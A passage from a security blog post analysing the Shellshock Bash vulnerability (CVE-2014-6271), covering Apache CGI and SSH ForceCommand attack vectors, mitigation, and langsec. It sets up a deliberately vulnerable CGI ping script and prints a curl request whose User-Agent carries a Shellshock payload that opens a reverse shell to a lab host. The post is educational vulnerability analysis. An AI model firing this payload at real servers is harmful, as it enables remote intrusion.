To enable CGI in Apache, first we need to enable the necessary modules in the <code>httpd.conf</code> file:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>LoadModule cgid_module modules/mod_cgid.so
</span></span></code></pre></div><p>We also need to specify that a particular directory is set aside for CGI programs. Apache will assume that every file in this directory is a CGI program and will try to execute it when that particular program is requested by a client. We can use the <code>ScriptAlias</code> directive in Apache to specify this.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ScriptAlias /cgi-bin/ &#34;/usr/local/apache2/cgi-bin/&#34;
</span></span></code></pre></div><p>With this, whenever the client sends a request like <code>https://test.com/cgi-bin/program.sh</code>, the server will check if the <code>program.sh</code> is present inside the <code>/usr/local/apache2/cgi-bin/</code> directory, and if it is present, will try to execute it. To permit execution of the programs inside <code>cgi-bin/</code>, we need to explicitly specify that using the <code>Options +ExecCGI</code> directive:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>&lt;Directory <span style=color:#b8bb26>&#34;/usr/local/apache2/cgi-bin&#34;</span>&gt;
</span></span><span style=display:flex><span>    AllowOverride None
</span></span><span style=display:flex><span>    <span style=color:#928374;font-style:italic># Enable CGI execution</span>
</span></span><span style=display:flex><span>    Options +ExecCGI
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    Require all granted
</span></span><span style=display:flex><span>    &lt;IfModule mime_module&gt;
</span></span><span style=display:flex><span>        ForceType application/x-httpd-cgi
</span></span><span style=display:flex><span>    &lt;/IfModule&gt;
</span></span><span style=display:flex><span>&lt;/Directory&gt;
</span></span></code></pre></div><p>We also need to tell the server that what files are CGI files. For that we will use the <code>AddHandler</code> directive:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>AddHandler cgi-script .sh
</span></span></code></pre></div><p>For testing purposes, we’ll create a <code>ping.sh</code> script that accepts an IP address from the client, runs <code>ping</code> on it, and returns the output.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#8ec07c>#!/usr/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#8ec07c></span>
</span></span><span style=display:flex><span>IP<span style=color:#fe8019>=</span><span style=color:#fe8019>$(</span><span style=color:#fabd2f>printf</span> <span style=color:#b8bb26>&#34;%s&#34;</span> <span style=color:#b8bb26>&#34;</span>$QUERY_STRING<span style=color:#b8bb26>&#34;</span> | sed -n <span style=color:#b8bb26>&#39;s/^ip=\([^&amp;]*\).*/\1/p&#39;</span><span style=color:#fe8019>)</span>
</span></span><span style=display:flex><span>PING_OUT<span style=color:#fe8019>=</span><span style=color:#fe8019>$(</span>ping -c <span style=color:#d3869b>2</span> -- <span style=color:#b8bb26>&#34;</span>$IP<span style=color:#b8bb26>&#34;</span><span style=color:#fe8019>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fabd2f>printf</span> <span style=color:#b8bb26>&#34;Content-type: text/html\n\n&#34;</span>
</span></span><span style=display:flex><span><span style=color:#fabd2f>printf</span> <span style=color:#b8bb26>&#34;%s&#34;</span> <span style=color:#b8bb26>&#34;</span>$PING_OUT<span style=color:#b8bb26>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#fabd2f>printf</span> <span style=color:#b8bb26>&#34;\n\n&#34;</span>
</span></span></code></pre></div><div class="alert alert-note collapsed"><div class=alert-heading-box onclick=toggleAlert(this)><i class="bx bx-info-circle"></i><p class=alert-heading>Note</p><i class='bx bx-chevron-down collapsed'></i></div><div class=alert-content style=display:none><p>Note that we have added <code>--</code> before the user input. According to <a href=https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html>POSIX</a>, anything after the <code>--</code> should be considered as operands to the program. Because <code>ping</code> complies with this standard, there would be no way to exploit it for command execution—if it weren&rsquo;t for Shellshock.</p></div></div><script>function toggleAlert(e){var t=e.parentElement,s=t.querySelector(".alert-content"),n=e.querySelectorAll("i")[1];t.classList.toggle("open"),t.classList.toggle("collapsed"),t.classList.contains("open")?(s.style.display="block",n.classList.remove("open"),n.classList.add("collapsed")):(n.classList.remove("collapsed"),n.classList.add("open"),s.style.display="none")}</script><p>With this, now we can set up a Docker container for testing. After running Docker, send a request with the Shellshock payload inside the <code>User-Agent</code>.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>curl -ik <span style=color:#b8bb26>&#39;http://localhost:8080/cgi-bin/ping.sh?ip=google.com&#39;</span> <span style=color:#b8bb26>\
</span></span></span><span style=display:flex><span><span style=color:#b8bb26></span>	 -H <span style=color:#b8bb26>&#39;User-Agent: () { :; };/usr/bin/bash -i &gt;&amp; /dev/tcp/172.17.0.1/1234 0&gt;&amp;1&#39;</span>
</span></span></code></pre></div><figure><img src=/img/shellshock/Pasted%20image%2020250714160303.webp></figure><p>This works because Apache parses the <code>User-Agent</code> and assigns its value to the <code>HTTP_USER_AGENT</code> environment variable. When the server spawns a new Bash process with these environment variables, our payload will be executed as well.</p><h3 id=secure-shell-ssh><a href=#secure-shell-ssh class=anchor-head aria-label=Anchor></a>Secure Shell (SSH)</h3><p>SSH is a service that can be used to securely access a shell on a remote host. We can use it to log in to a different host and execute commands in that system. You might ask: if SSH itself provides shell access, then what is the purpose of using Shellshock to get a shell? This is a valid question in most cases where SSH is configured to allow full shell access. However, there are instances where the server is configured to restrict users from accessing a normal shell. Instead, it provides a restricted shell, where only specific commands or scripts are allowed to execute as a particular user. The <code>ForceCommand</code> directive in the <code>sshd_config</code> file is used for this purpose. Most commonly this feature is used to run automated tasks when a specific user logs into the machine.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Match user backup_user
</span></span><span style=display:flex><span>	ForceCommand /usr/local/bin/backup.sh
</span></span><span style=display:flex><span>	PermitTTY no
</span></span></code></pre></div><p>This directive will execute the <code>backup.sh</code> script whenever the <code>backup_user</code> logs in through SSH. <code>backup_user</code> is only there to do the backup, and the <code>PermitTTY no</code> directive ensures that the user does not get full shell access.</p><p>There&rsquo;s also a feature in SSH that allows users to pass environment variables to the system. This also needs some additional configuration in the <code>sshd_config</code> file of the server:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>PermitUserEnvironment yes
</span></span><span style=display:flex><span>AcceptEnv USER_ENV
</span></span></code></pre></div><p>With these, users can pass the <code>USER_ENV</code> environment variable into the server. By default the <code>PermitUserEnvironment</code> is set to <code>no</code> since it can be used to bypass access restrictions in some configurations even without a Shellshock vulnerability. For example, by overwriting environment variables like <code>LD_PRELOAD</code>, <code>LD_LIBRARY_PATH</code>, etc., a user can load malicious shared libraries and overwrite system calls. A safer alternative is to use the <code>AcceptEnv</code> directive, which allows only whitelisted environment variables to be copied into the system.</p><p>Now imagine an SSH server that is set up to run a shell script every time a user logs in using the <code>ForceCommand</code> directive, where either the <code>PermitUserEnvironment</code> or <code>AcceptEnv</code> is set. If the server is using a vulnerable Bash version and we know the password of the user, then we can pass a crafted environment variable and pass it to the server using <code>-o SendEnv=VAR</code>. Which will trigger Shellshock and bypass the restriction to get full shell access.</p><p>I have created a Docker lab setup to test this, which you can access <a href=https://github.com/h4r1337/cve-labs/tree/main/CVE-2014-6271/ssh>here in my GitHub</a>.
For this lab I created a simple bash script that will just print a welcome message and exit.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#8ec07c>#!/usr/bin/env bash
</span></span></span><span style=display:flex><span><span style=color:#8ec07c></span>
</span></span><span style=display:flex><span><span style=color:#fabd2f>echo</span> <span style=color:#b8bb26>&#34;Welcome to my SSH Server&#34;</span>
</span></span><span style=display:flex><span><span style=color:#fabd2f>echo</span> <span style=color:#b8bb26>&#34;========================&#34;</span>
</span></span><span style=display:flex><span><span style=color:#fabd2f>echo</span>
</span></span><span style=display:flex><span><span style=color:#fabd2f>echo</span> <span style=color:#b8bb26>&#34;Maintenance: &#34;</span>
</span></span><span style=display:flex><span><span style=color:#fabd2f>echo</span> <span style=color:#b8bb26>&#34;Unfortunately the server is under maintenance, come back later&#34;</span>
</span></span><span style=display:flex><span><span style=color:#fabd2f>exit</span>
</span></span></code></pre></div><p>I then added these configurations in the <code>/etc/ssh/sshd_config</code> file:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#928374;font-style:italic># Enable root login</span>
</span></span><span style=display:flex><span>PermitRootLogin yes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Disable TTY access</span>
</span></span><span style=display:flex><span>PermitTTY no
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Allow environment variable</span>
</span></span><span style=display:flex><span>AcceptEnv LANG LC_<span style=color:#fe8019>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Command to execute on login.</span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># There&#39;s no Match directive specified, so by default all </span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># users will execute this script on login.</span>
</span></span><span style=display:flex><span>ForceCommand <span style=color:#fe8019>/</span>sbin<span style=color:#fe8019>/</span>welcome_script<span style=color:#fe8019>.</span>sh
</span></span></code></pre></div><figure><img src=/img/shellshock/Pasted%20image%2020250731145458.webp></figure><p>There are more attack vectors, which we won&rsquo;t explore in this blog (maybe in the future). I will list some of them here, if you want to explore it yourself:</p><ul><li>DHCP</li><li>Mail services</li><li>Open VPN</li></ul><h2 id=mitigation><a href=#mitigation class=anchor-head aria-label=Anchor></a>Mitigation</h2><p>The initial patch introduced by the maintainer of Bash didn&rsquo;t fix the core issue entirely, and people started to find various other related but different parsing bugs. After Shellshock, with the new knowledge that merely having the shell parse arbitrary environment variables is exploitable, people realized that the Bash parser was an attack surface. With this realization people began trying standard techniques like fuzzing to quickly find new vulnerabilities in the parser.</p><p>The one quick fix used to fix Shellshock was to disable function export entirely. This was done by adding the <code>-p</code> flag, which makes the process run in privileged mode.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#fe8019>-</span>p  Turn on privileged mode<span style=color:#fe8019>.</span> In this mode, the <span style=color:#fe8019>$</span>ENV <span style=color:#fe8019>and</span> <span style=color:#fe8019>$</span>BASH_ENV files
</span></span><span style=display:flex><span>  are <span style=color:#fe8019>not</span> processed, shell functions are <span style=color:#fe8019>not</span> inherited from the
</span></span><span style=display:flex><span>  environment, <span style=color:#fe8019>and</span> the SHELLOPTS, BASHOPTS, CDPATH, <span style=color:#fe8019>and</span> GLOBIGNORE
</span></span><span style=display:flex><span>  variables, <span style=color:#fe8019>if</span> they appear <span style=color:#fe8019>in</span> the environment, are ignored<span style=color:#fe8019>.</span>  If the
</span></span><span style=display:flex><span>  shell is started with the effective user (group) id <span style=color:#fe8019>not</span> equal to the
</span></span><span style=display:flex><span>  real user (group) id, <span style=color:#fe8019>and</span> the <span style=color:#fe8019>-</span>p option is <span style=color:#fe8019>not</span> supplied, these
</span></span><span style=display:flex><span>  actions are taken <span style=color:#fe8019>and</span> the effective user id is set to the real user
</span></span><span style=display:flex><span>  id<span style=color:#fe8019>.</span>  If the <span style=color:#fe8019>-</span>p option is supplied at startup, the effective user id
</span></span><span style=display:flex><span>  is <span style=color:#fe8019>not</span> reset<span style=color:#fe8019>.</span>  Turning this option off causes the effective user <span style=color:#fe8019>and</span>
</span></span><span style=display:flex><span>  group ids to be set to the real user <span style=color:#fe8019>and</span> group ids<span style=color:#fe8019>.</span>
</span></span></code></pre></div><p>If you remember from the <a href=#Root%20Cause%20Analysis>Root Cause Analysis</a> section, shell functions are only parsed if the <code>privmode</code> variable is set to 0. So this is a valid fix to Shellshock. But more often than not, developers needed this feature, and temporarily disabling function export doesn&rsquo;t fix the underlying vulnerability.</p><p>On September 25, Florian Weimer, a researcher from Red Hat, posted an <a href=https://www.openwall.com/lists/oss-security/2014/09/25/13>unofficial patch</a> addressing Shellshock and its variants. In that patch, he addressed the issue and found a general solution to it by only parsing functions if the name starts with a prefix <code>BASH_FUNC_</code> and ends with a suffix <code>()</code>. Soon people realized that separating shell functions into their own special namespace would fix the underlying issue, and most implementations used this prefix + suffix fix.</p><h2 id=beyond-shellshock><a href=#beyond-shellshock class=anchor-head aria-label=Anchor></a>Beyond Shellshock</h2><h3 id=in-the-wild-exploits><a href=#in-the-wild-exploits class=anchor-head aria-label=Anchor></a>In the wild exploits</h3><p>Considering the simplicity of the vulnerability, it is surprising that this bug remained hidden for about 25 years, dating back to version 1.03, released in September 1989. A direct follow-up question would be if anyone else knew about this vulnerability and if it was being exploited prior to its public disclosure. As in the case of Shellshock, unlike other similar (in the case of mass exploitation) vulnerabilities like the infamous Heartbleed, which leaves no trace, Shellshock activities can be clearly logged and easily detected. However, we haven&rsquo;t come across any official evidence or reports of its use in public. Still, we cannot entirely rule out the possibility of in-the-wild exploitation since, if Shellshock gave attackers full system access, they would likely take measures to avoid detection and clear all the logs considering its exploitability. But it is highly unlikely that no mistakes would be made by the attackers that leave behind at least some trace of evidence.</p><p>Even if you argue that nation-state threat actors wouldn&rsquo;t leave any traces behind, they didn&rsquo;t have such advanced Opsec techniques all the time. Even today nation-states tend to make mistakes and leave traces behind on various attacks. Therefore, it is extremely doubtful that they had such techniques before 2014. And as for the case of finding the Shellshock vulnerability, <a href=https://seclists.org/oss-sec/2014/q4/224>Stéphane Chazelas himself stated</a> that he did not find the vulnerability by reading Bash source code. No one in their sane mind would think of auditing Bash source code; <a href=http://www.openwall.com/lists/oss-security/2014/10/07/26>as Michal Zalewski put it</a>, it wouldn&rsquo;t be much better than auditing <code>/bin/uname</code>. Even if you knew Bash parses arbitrary environment variables incorrectly, it would take a much greater realization to find out that this incorrect parsing of a shell environment variable poses a significant security risk.</p><p>In the end Shellshock is caused due to its ambiguous design and parser implementation choices, as well as its failure to maintain proper separation of code and data. Bash alone cannot be blamed for this; third parties using it for configuration made this subtle parser quirk even more severe. Which brings us to <a href=https://langsec.org/>LangSec.</a></p><h3 id=language-theoretic-security-and-mismorphisms><a href=#language-theoretic-security-and-mismorphisms class=anchor-head aria-label=Anchor></a>Language theoretic security and mismorphisms</h3><blockquote><p>But if you can prove that the input for program A
constructs a turing complete grammar you have already lost.
You cannot &ldquo;fix&rdquo; these bugs, as there is an infinite number of them.
You need to fix the parsers and the languages first.</p></blockquote><p>I think this is the right time to mention langsec research. <a href=https://www.cs.dartmouth.edu/~sws/pubs/aisw2019.pdf>As this paper states</a>, &ldquo;Mismorphisms—instances where predicates take on different truth values across different interpretations of reality (notably, different actors’ perceptions of reality and the actual reality)—are the source of weird instructions.&rdquo;</p><p>The syntax used to export static variables can also be applied to export shell functions, which the interpreter then parses and executes. This broke the assumption that values in these contexts would be treated purely as data, creating a false sense of security. Third parties like Apache CGI, SSH, etc. began using this feature for managing configurations, which now contains untrusted user inputs, creating a weird machine. Adding to this is the fact that the parser is broken, allowing a user to append arbitrary commands after the function definition, which the parser then executes.</p><p>Seen through the langsec lens, much more can be learned about secure software development. Shellshock is a great example of how layering convenient features across components (e.g., Apache -> CGI -> Bash) builds accidental weird machines.</p><hr><p>That&rsquo;s it for today. While researching this one, I found many informative discussions, articles, and research papers. All of them are listed below.</p><p>Go through it if you want to learn about the various perspectives and opinions of people on this incident. I especially recommend reading this particular <a href=https://dwheeler.com/essays/shellshock.html>essay</a>, which goes far beyond Shellshock and provides general information as well as various measures to prevent such vulnerabilities in the future.</p><h4 id=references><a href=#references class=anchor-head aria-label=Anchor></a>References</h4><ul><li><a href="https://www.cve.org/CVERecord?id=CVE-2014-6271">https://www.cve.org/CVERecord?id=CVE-2014-6271</a></li><li><a href=https://infosecnirvana.com/attack-vectors-used-shellshock/>https://infosecnirvana.com/attack-vectors-used-shellshock/</a></li><li><a href=https://dwheeler.com/essays/shellshock.html>https://dwheeler.com/essays/shellshock.html</a></li><li><a href=https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells/171347#171347>https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells/171347#171347</a></li><li><a href=https://seclists.org/oss-sec/2014/q3/650>https://seclists.org/oss-sec/2014/q3/650</a></li><li><a href=https://httpd.apache.org/docs/2.4/howto/cgi.html>https://httpd.apache.org/docs/2.4/howto/cgi.html</a></li><li><a href=https://www.openwall.com/lists/oss-security/2014/10/07/23>https://www.openwall.com/lists/oss-security/2014/10/07/23</a></li><li><a href=https://lists.openwall.net/full-disclosure/2014/10/01/10>https://lists.openwall.net/full-disclosure/2014/10/01/10</a></li><li><a href=https://security.stackexchange.com/questions/166903/is-there-evidence-of-shellshock-being-exploited-before-its-public-announcement>https://security.stackexchange.com/questions/166903/is-there-evidence-of-shellshock-being-exploited-before-its-public-announcement</a></li><li><a href=https://www.cs.dartmouth.edu/~sws/pubs/aisw2019.pdf>https://www.cs.dartmouth.edu/~sws/pubs/aisw2019.pdf</a></li></ul></div></article></main><aside id=sticky-top><div class=toc-title><p>CVE-2014-6271 - Shellshock</p><hr id=toc-hr></div><nav id=toc class=toc-container><nav id=TableOfContents><ul><li><a href=#summary>Summary</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#environment-variables>Environment Variables</a></li><li><a href=#function-as-environment-variables>Function as Environment Variables</a></li><li><a href=#the-payload>The payload</a></li></ul></li><li><a href=#root-cause-analysis>Root Cause Analysis</a></li><li><a href=#attack-vectors>Attack Vectors</a><ul><li><a href=#common-gateway-interface-cgi>Common Gateway Interface (CGI)</a></li><li><a href=#secure-shell-ssh>Secure Shell (SSH)</a></li></ul></li><li><a href=#mitigation>Mitigation</a></li><li><a href=#beyond-shellshock>Beyond Shellshock</a><ul><li><a href=#in-the-wild-exploits>In the wild exploits</a></li><li><a href=#language-theoretic-security-and-mismorphisms>Language theoretic security and mismorphisms</a></li></ul></li></ul></nav></nav></aside><small class=post-updated-at>updated at 2025-09-22</small><hr><div class=series-nav><div class="alert alert-note"><div class=alert-heading-box><a href=https://h4r1337.github.io/series/cve-analysis/><p class=alert-heading>Cve-Analysis Series</p></a></div></div><nav class=post-nav style=margin-top:1rem;border-top:none></nav></div><nav class=post-nav><a class="post-nav-item post-nav-prev" href=https://h4r1337.github.io/posts/tfcctf-25/><div class=nav-arrow>Previous</div><span class=post-title>TFC CTF 2025 Writeups</span></a></nav></div><footer class=footer><a class=footer_item href=javascript::void(0)>resume</a>
<a class=footer_item href=/index.xml>rss</a>
<span class=footer_item>&copy; 2025</span>
<small class=footer_copyright><a href=https://github.com/h4r1337/hugo-klise target=_blank rel="noreferrer noopener">hugo-klisé</a>
theme on
<a href=https://gohugo.io target=_blank rel="noreferrer noopener">Hugo</a><br><span>Made by <a href=https://github.com/h4r1337 target=_blank rel="noreferrer noopener">h4r1337</a></span></small></footer><script src=/js/main.js defer></script><script src=/js/toc.js defer></script></body></html>